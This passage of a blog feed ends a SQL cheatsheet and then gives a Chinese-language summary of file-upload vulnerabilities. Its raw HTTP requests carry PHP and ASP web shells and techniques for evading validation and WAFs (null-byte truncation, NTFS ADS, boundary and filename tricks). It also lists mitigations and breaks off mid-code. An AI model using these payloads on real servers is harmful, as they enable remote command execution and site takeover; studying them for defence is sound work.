连接查询"></a>4. 连接查询</h1><h3 id="INNER-JOIN-内连接，返回在两张表中具有匹配值的记录"><a href="#INNER-JOIN-内连接，返回在两张表中具有匹配值的记录" class="headerlink" title="INNER JOIN: 内连接，返回在两张表中具有匹配值的记录"></a><strong>INNER JOIN</strong>: 内连接，返回在两张表中具有匹配值的记录</h3><ul><li><code>SELECT</code> column_names <code>FROM</code> table1 <code>INNER JOIN</code> table2 <code>ON</code> table1.column_name=table2.column_name;</li><li><code>SELECT</code> table1.column_name1, table2.column_name2, table3.column_name3 <code>FROM</code> ((table1 <code>INNER JOIN</code> table2 <code>ON</code> relationship) <code>INNER JOIN</code> table3 <code>ON</code> relationship);</li></ul><h3 id="LEFT-OUTER-JOIN-左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）"><a href="#LEFT-OUTER-JOIN-左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）" class="headerlink" title="LEFT (OUTER) JOIN: 左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）"></a><strong>LEFT (OUTER) JOIN</strong>: 左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）</h3><ul><li><code>SELECT</code> column_names <code>FROM</code> table1 <code>LEFT JOIN</code> table2 <code>ON</code> table1.column_name=table2.column_name;</li></ul><h3 id="RIGHT-OUTER-JOIN-右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录"><a href="#RIGHT-OUTER-JOIN-右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录" class="headerlink" title="RIGHT (OUTER) JOIN: 右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录"></a><strong>RIGHT (OUTER) JOIN</strong>: 右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录</h3><ul><li><code>SELECT</code> column_names <code>FROM</code> table1 <code>RIGHT JOIN</code> table2 <code>ON</code> table1.column_name=table2.column_name;</li></ul><h3 id="FULL-OUTER-JOIN-全外连接，全连接是左右外连接的并集-连接表包含被连接的表的所有记录-如果缺少匹配的记录-以-NULL-填充。"><a href="#FULL-OUTER-JOIN-全外连接，全连接是左右外连接的并集-连接表包含被连接的表的所有记录-如果缺少匹配的记录-以-NULL-填充。" class="headerlink" title="FULL (OUTER) JOIN: 全外连接，全连接是左右外连接的并集. 连接表包含被连接的表的所有记录, 如果缺少匹配的记录, 以 NULL 填充。"></a><strong>FULL (OUTER) JOIN</strong>: 全外连接，全连接是左右外连接的并集. 连接表包含被连接的表的所有记录, 如果缺少匹配的记录, 以 NULL 填充。</h3><ul><li><code>SELECT</code> column_names <code>FROM</code> table1 <code>FULL OUTER JOIN</code> table2 <code>ON</code> table1.column_name=table2.column_name;</li></ul><h3 id="Self-JOIN-自连接，表自身连接"><a href="#Self-JOIN-自连接，表自身连接" class="headerlink" title="Self JOIN: 自连接，表自身连接"></a><strong>Self JOIN</strong>: 自连接，表自身连接</h3><ul><li><code>SELECT</code> column_names <code>FROM</code> table1 T1, table1 T2 <code>WHERE</code> condition;</li></ul><p><a name="view"></a></p><h1 id="5-视图查询"><a href="#5-视图查询" class="headerlink" title="5. 视图查询"></a>5. 视图查询</h1><h3 id="CREATE-创建视图"><a href="#CREATE-创建视图" class="headerlink" title="CREATE: 创建视图"></a><strong>CREATE</strong>: 创建视图</h3><ul><li><code>CREATE VIEW</code> view_name <code>AS SELECT</code> column1, column2 <code>FROM</code> table_name <code>WHERE</code> condition;</li></ul><h3 id="SELECT-检索视图"><a href="#SELECT-检索视图" class="headerlink" title="SELECT: 检索视图"></a><strong>SELECT</strong>: 检索视图</h3><ul><li><code>SELECT</code> * <code>FROM</code> view_name;</li></ul><h3 id="DROP-删除视图"><a href="#DROP-删除视图" class="headerlink" title="DROP: 删除视图"></a><strong>DROP</strong>: 删除视图</h3><ul><li><code>DROP VIEW</code> view_name;</li></ul><p><a name="alter"></a></p><h1 id="6-修改表的查询"><a href="#6-修改表的查询" class="headerlink" title="6. 修改表的查询"></a>6. 修改表的查询</h1><h3 id="ADD-添加字段"><a href="#ADD-添加字段" class="headerlink" title="ADD: 添加字段"></a><strong>ADD</strong>: 添加字段</h3><ul><li><code>ALTER TABLE</code> table_name <code>ADD</code> column_name column_definition;</li></ul><h3 id="MODIFY-修改字段数据类型"><a href="#MODIFY-修改字段数据类型" class="headerlink" title="MODIFY: 修改字段数据类型"></a><strong>MODIFY</strong>: 修改字段数据类型</h3><ul><li><code>ALTER TABLE</code> table_name <code>MODIFY</code> column_name column_type;</li></ul><h3 id="DROP-删除字段"><a href="#DROP-删除字段" class="headerlink" title="DROP: 删除字段"></a><strong>DROP</strong>: 删除字段</h3><ul><li><code>ALTER TABLE</code> table_name <code>DROP COLUMN</code> column_name;</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;内容&quot;&gt;&lt;a href=&quot;#内容&quot; class=&quot;headerlink&quot; title=&quot;内容&quot;&gt;&lt;/a&gt;内容&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;#find&quot;&gt; 查找数据的查询 &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#modify&quot;&gt; 修改数据的查询 &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#report&quot;&gt; 聚合查询 &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#joins&quot;&gt; 连接查询 &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#view&quot;&gt; 视图查询 &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#alter&quot;&gt; 修改表的查询 &lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="note" scheme="http://pa55w0rd.github.io/categories/note/"/>
    
    
  </entry>
  
  <entry>
    <title>文件上传漏洞总结</title>
    <link href="http://pa55w0rd.github.io/fileupload/"/>
    <id>http://pa55w0rd.github.io/fileupload/</id>
    <published>2018-10-19T09:24:03.000Z</published>
    <updated>2018-11-20T10:37:30.828Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在web应用程序中，文件上传是一种常见的要求，因为它有助于提高业务效率。在大型社交网络程序中都支持文件上传功能。在博客，论坛，电子银行网络，会给用户和企业员工有效的共享文件。允许上传图片，视频，头像和许多其他类型文件。 </p><p>上传文件的时候，如果服务器端脚本语言，未对上传的文件进行严格的验证和过滤，就有可能上传恶意的脚本文件，从而控制整个网站，甚至是服务器。 </p><a id="more"></a><p><strong>漏洞挖掘和利用</strong></p><p>查找上传点，图片，头像，附件；目录，文件扫描发现类似upload,php等文件，编译器目录如ewebeditor,fckeditor,kingeditor等 </p><h2 id="0x01-文件上传校验姿势"><a href="#0x01-文件上传校验姿势" class="headerlink" title="0x01 文件上传校验姿势"></a>0x01 文件上传校验姿势</h2><ul><li>客户端javascript校验（一般只校验后缀名）</li><li>服务端校验<ul><li>文件头content-type字段校验（image/gif）</li><li>文件内容头校验（GIF89a）</li><li>后缀名黑名单校验</li><li>后缀名白名单校验</li><li>自定义正则校验</li></ul></li><li>WAF设备校验（根据不同的WAF产品而定）</li></ul><h3 id="1-1-客户端校验"><a href="#1-1-客户端校验" class="headerlink" title="1.1 客户端校验"></a>1.1 客户端校验</h3><p>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。</p><p>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p><h3 id="1-2-服务端校验"><a href="#1-2-服务端校验" class="headerlink" title="1.2 服务端校验"></a>1.2 服务端校验</h3><p><strong>1.2.1 content-type字段校验</strong></p><p>这里以PHP代码为例，模拟web服务器端的校验代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)  <span class="comment">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></span><br><span class="line">        &#123;   </span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">         <span class="keyword">exit</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    $uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">    $uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>],$uploadfile))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p><p><strong>1.2.2 文件内容头校验</strong></p><p>可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：</p><ul><li>.JPEG;.JPE;.JPG，”JPGGraphic File”</li><li>.gif，”GIF 89A”</li><li>.zip，”Zip Compressed”</li><li>.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li></ul><h2 id="0x02-文件上传绕过校验姿势"><a href="#0x02-文件上传绕过校验姿势" class="headerlink" title="0x02 文件上传绕过校验姿势"></a>0x02 文件上传绕过校验姿势</h2><ul><li>客户端绕过（抓包改包）</li><li>服务端绕过<ul><li>文件类型</li><li>文件头</li><li>文件后缀名</li></ul></li><li>HTTP不安全方法(PUT方法)</li><li>配合文件包含漏洞绕过</li><li>配合服务器解析漏洞绕过</li><li>CMS、编辑器漏洞绕过</li><li>配合操作系统文件命名规则绕过</li><li>配合其他规则绕过</li><li>WAF绕过</li></ul><h3 id="2-1-客户端绕过"><a href="#2-1-客户端绕过" class="headerlink" title="2.1 客户端绕过"></a>2.1 客户端绕过</h3><p>可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p><h3 id="2-2-服务端绕过"><a href="#2-2-服务端绕过" class="headerlink" title="2.2 服务端绕过"></a>2.2 服务端绕过</h3><p><strong>2.2.1 文件类型绕过</strong></p><p>我们可以通过抓包，将content-type字段改为image/gif</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="regexp">/upload.php HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">TE:</span> deflate,gzip;q=<span class="number">0.3</span></span><br><span class="line"><span class="string">Connection:</span> TE, close</span><br><span class="line"><span class="string">Host:</span> localhost</span><br><span class="line">User-<span class="string">Agent:</span> libwww-perl/<span class="number">5.803</span></span><br><span class="line">Content-<span class="string">Type:</span> multipart/form-data; boundary=xYzZY</span><br><span class="line">Content-<span class="string">Length:</span> <span class="number">155</span></span><br><span class="line">--xYzZY</span><br><span class="line">Content-<span class="string">Disposition:</span> form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.php"</span></span><br><span class="line">Content-<span class="string">Type:</span> image<span class="regexp">/gif (原为 Content-Type: text/</span>plain)</span><br><span class="line">&lt;?php system($_GET['command']);?&gt;</span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure><p><strong>2.2.2 文件头绕过</strong></p><p>在木马内容基础上再加了一些文件信息，有点像下面的结构</p><p><code>GIF89a&lt;?php phpinfo(); ?&gt;</code></p><p>或构造图片吗，将恶意文本写入图片的二进制代码，避免破坏图片文件头和尾</p><p><code>copy xx.jpg/b + yy.txt/a xy.jpg</code></p><ul><li><p>/b 即二进制[binary]模式</p></li><li><p>/a 即ascii模式 xx.jpg正常图片文件 </p></li></ul><p><strong>2.2.3 文件后缀名绕过</strong></p><p>前提：黑名单校验</p><p>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。</p><p>绕过方法：</p><ul><li>找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类</li><li>可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</li></ul><p>能被解析的文件扩展名列表：</p><ul><li>jsp jspx jspf</li><li>asp asa cer aspx</li><li>php php php3 php4</li><li>exe exee</li></ul><h3 id="2-3-配合文件包含漏洞"><a href="#2-3-配合文件包含漏洞" class="headerlink" title="2.3 配合文件包含漏洞"></a>2.3 配合文件包含漏洞</h3><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p><p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p><ul><li>先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</li><li>然后再上传一个.php的文件，内容为<code>&lt;?php Include(“上传的txt文件路径”);?&gt;</code></li></ul><p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">#PHP    </span></span><br><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(<span class="string">"上传的txt文件路径"</span>);<span class="meta">?&gt;</span></span> </span></span><br><span class="line"><span class="xml">#ASP    </span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--#include file="上传的txt文件路径" --&gt;</span></span></span><br><span class="line"><span class="xml">#JSP    </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">jsp:inclde</span> <span class="attr">page</span>=<span class="string">"上传的txt文件路径"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">or  </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@include file=<span class="string">"上传的txt文件路径"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="2-4-配合文件解析漏洞"><a href="#2-4-配合文件解析漏洞" class="headerlink" title="2.4 配合文件解析漏洞"></a>2.4 配合文件解析漏洞</h3><h3 id="2-5-配合操作系统文件命名规则"><a href="#2-5-配合操作系统文件命名规则" class="headerlink" title="2.5 配合操作系统文件命名规则"></a>2.5 配合操作系统文件命名规则</h3><ol><li><p>上传不符合windows文件命名规则的文件名</p><ul><li>test.asp.</li><li>test.asp(空格)</li><li>test.php:1.jpg</li><li>test.php::$DATA</li><li><p>shell.php::$DATA…….</p><p>会被windows系统自动去掉不符合规则符号后面的内容。</p></li></ul></li><li><p>linux下后缀名大小写</p><p> 在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p></li></ol><h3 id="2-6-CMS、编辑器漏洞"><a href="#2-6-CMS、编辑器漏洞" class="headerlink" title="2.6 CMS、编辑器漏洞"></a>2.6 CMS、编辑器漏洞</h3><ol><li>CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</li><li>编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。</li></ol><h3 id="2-7-配合其他规则"><a href="#2-7-配合其他规则" class="headerlink" title="2.7 配合其他规则"></a>2.7 配合其他规则</h3><p>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p><ul><li>test.php(0x00).jpg</li><li>test.php%00.jpg</li><li>路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</li></ul><p>伪代码演示：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name= getname(httprequest) <span class="comment">//假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</span></span><br><span class="line">type =gettype(name)        <span class="comment">//而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</span></span><br><span class="line"><span class="keyword">if</span>(type == jpg)</span><br><span class="line">   SaveFileToPath(UploadPath.name, name)   <span class="comment">//但在这里却是以 0x00 作为文件名截断</span></span><br><span class="line"><span class="comment">//最后以 help.asp 存入路径里</span></span><br></pre></td></tr></table></figure></p><h3 id="2-8-WAF绕过"><a href="#2-8-WAF绕过" class="headerlink" title="2.8 WAF绕过"></a>2.8 WAF绕过</h3><p><strong>2.8.1 垃圾数据</strong></p><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p><p>可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p><p>也可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/<span class="number">1.1</span></span><br><span class="line">TE: deflate,gzip;q=<span class="number">0.3</span></span><br><span class="line">Connection: TE, close</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: libwww-perl/<span class="number">5.803</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=xYzZY</span><br><span class="line">Content-Length: <span class="number">155</span></span><br><span class="line"><span class="comment">/////////可以在这里添加a=11111111111....</span></span><br><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.php"</span>;<span class="comment">/////////可以在这里添加a=11111111111....</span></span><br><span class="line">Content-Type: image/gif</span><br><span class="line"><span class="comment">/////////可以在这里添加a=11111111111....</span></span><br><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'command'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure><p><strong>2.8.2 filename</strong></p><p>针对早期版本安全狗，可以多加一个filename</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.jpg"</span>;filename=<span class="string">"shell.php"</span> <span class="comment">//多加一个filename</span></span><br><span class="line">Content-Type: image/gif</span><br><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'command'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure><p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"userfile"</span></span><br><span class="line">Content-Type: image/gif</span><br><span class="line">filename=<span class="string">"shell.php"</span>  <span class="comment">//把filemane放这里</span></span><br><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'command'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure><p><strong>2.8.3 POTS/GET</strong></p><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。</p><p>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p><p><strong>2.8.4 利用waf本身缺陷</strong></p><ul><li>删除实体里面的Conten-Type字段</li></ul><p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正常包：Content-Disposition: form-data; name=<span class="string">"image"</span>; filename=<span class="string">"085733uykwusqcs8vw8wky.png"</span>Content-Type: image/png</span><br><span class="line">构造包：Content-Disposition: form-data; name=<span class="string">"image"</span>; filename=<span class="string">"085733uykwusqcs8vw8wky.png</span></span><br><span class="line"><span class="string">C.php"</span></span><br></pre></td></tr></table></figure><ul><li><p>删除Content-Disposition字段里的空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition:<span class="comment">/*这里空格删除*/</span>form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.php"</span></span><br></pre></td></tr></table></figure></li><li><p>增加一个空格导致安全狗被绕过案列：</p></li></ul><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Content</span>-Type: <span class="keyword">multipart/form-data; </span><span class="keyword">boundary=—————————4714631421141173021852555099</span></span><br><span class="line"><span class="keyword">尝试在boundary后面加个空格或者其他可被正常处理的字符：</span></span><br><span class="line"><span class="keyword">boundary= </span>—————————<span class="number">47146314211411730218525550</span></span><br></pre></td></tr></table></figure><ul><li><p>修改Content-Disposition字段值的大小写</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; <span class="attribute">nAme</span>=<span class="string">"userfile"</span>; <span class="attribute">filename</span>=<span class="string">"shell.php"</span></span><br></pre></td></tr></table></figure></li><li><p>Boundary边界不一致</p></li></ul><p>每次文件上传时的Boundary边界都是一致的：</p><p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：</p><p>Win2k3 + IIS6.0 + ASP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=--------------------------<span class="number">-471463142114117302185255</span>dddd <span class="comment">//修改</span></span><br><span class="line">Content-Length: <span class="number">253</span></span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.asp"</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">"a"</span>)%&gt;</span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span>--</span><br></pre></td></tr></table></figure><ul><li><p>文件名回车</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.ph</span></span><br><span class="line"><span class="string">p"</span> <span class="comment">//php中间回车</span></span><br></pre></td></tr></table></figure></li><li><p>多个Content-Disposition</p></li></ul><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过</p><p>Win2k8 + IIS7.0 + PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=--------------------------<span class="number">-4714631421141173021852555099</span> </span><br><span class="line">Content-Length: <span class="number">253</span></span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.php"</span></span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.jpg"</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">"a"</span>)%&gt;</span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span>--</span><br></pre></td></tr></table></figure><ul><li>利用NTFS ADS 特性</li></ul><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。</p><table><thead><tr><th>上传的文件名</th><th>服务器表面现象</th><th>生成的文件内容</th></tr></thead><tbody><tr><td>Test.php:a.jpg</td><td>生成Test.php</td><td>空</td></tr><tr><td>Test.php::$DATA</td><td>生成test.php</td><td>\&lt;?php phpinfo();?&gt;</td></tr><tr><td>Test.php::$INDEX_ALLOCATION</td><td>生成test.php文件夹</td><td></td></tr><tr><td>Test.php::$DATA.jpg</td><td>生成0.jgp</td><td>\&lt;?php phpinfo();?&gt;</td></tr><tr><td>Test.php::$DATA\aaa.jpg</td><td>生成aaa.jpg</td><td>\&lt;?php phpinfo();?&gt;</td></tr></tbody></table><ul><li>文件重命名绕过</li></ul><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell...............................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">............................................php"</span></span><br></pre></td></tr></table></figure></p><ul><li>特殊的长文件名绕过</li></ul><p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">shell</span><span class="selector-class">.asp</span>;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王<span class="selector-class">.jpg</span></span><br></pre></td></tr></table></figure></p><p><strong>2.8.5</strong> 其他绕过</p><p>如服务器解析漏洞、文件包含漏洞等尝试绕过</p><h3 id="2-9-HTTP不安全方法"><a href="#2-9-HTTP不安全方法" class="headerlink" title="2.9 HTTP不安全方法"></a>2.9 HTTP不安全方法</h3><p> 当服务器配置不当时，在不需要的上传页面的情况下导致任意文件上传（PUT协议） </p><h2 id="0x03-文件校验的几点建议"><a href="#0x03-文件校验的几点建议" class="headerlink" title="0x03 文件校验的几点建议"></a>0x03 文件校验的几点建议</h2><ul><li>上传文件的存储目录禁用执行权限</li><li>文件扩展名服务端白名单校验，注意0x00截断攻击 </li><li>文件内容服务端校验。</li><li>上传文件重命名。</li><li>隐藏上传文件路径。</li></ul><p>以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。 </p><h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>php修复代码参考</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 